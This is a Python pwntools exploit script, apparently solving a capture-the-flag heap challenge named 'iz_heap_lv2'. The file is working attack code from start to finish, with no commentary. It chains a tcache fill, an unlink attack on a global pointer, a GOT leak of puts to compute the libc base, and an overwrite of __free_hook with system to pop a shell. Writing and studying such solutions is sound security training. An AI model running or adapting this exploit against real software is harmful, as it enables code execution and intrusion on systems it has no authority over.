from pwn import *
context.log_level = 'debug'

TARGET = './iz_heap_lv2'
HOST = ''
PORT = 0

r = process(TARGET)
# r = process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
# r = remote(HOST, PORT)

gdb.attach(r, '''
c
''')
elf = ELF(TARGET)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

def add(size, data):
    r.sendline('1')
    r.sendlineafter('size:', str(size))
    if len(data) == size:
        r.sendafter('data:', data) 
    else:
        r.sendlineafter('data:', data)
    r.recvuntil('Choice:')

def edit(index, data): 
    r.sendline('2')
    r.sendlineafter('index:', str(index))
    r.sendlineafter('data:', data)
    r.recvuntil('Choice:')

def delete(index):
    r.sendline('3')
    r.sendlineafter('index:', str(index))
    r.recvuntil('Choice:')

def show(index):
    r.sendline('4')
    r.sendlineafter('index:', str(index))
    text = r.recvuntil('Choice:')
    return text 

r.recvuntil('Choice:')

target = 0x602048
add(0x20, 'A')
add(0x20, 'B')
for i in range(8):
    add(0xf0, 'A')

for i in range(7):
    delete(9 - i)

delete(1)
payload = p64(0) + p64(0x21) + p64(target-0x18) + p64(target-0x10) + p64(0x20)
add(0x28, payload)
delete(2)

edit(1, p64(0) * 2 + p64(elf.got['puts'])+p64(target-0x18))
leak = u64(show(0).split('\n')[0][-6:].ljust(8, '\x00'))
dbg("leak")
base = leak - 0x809c0
system = base + 0x4f440
free_hook = base + 0x3ed8e8

edit(1, p64(0) * 2 + p64(free_hook))
edit(0, p64(system))
add(0x10, '/bin/sh')

r.sendline('3')
r.sendlineafter('index:', '3')

r.interactive()
r.close()
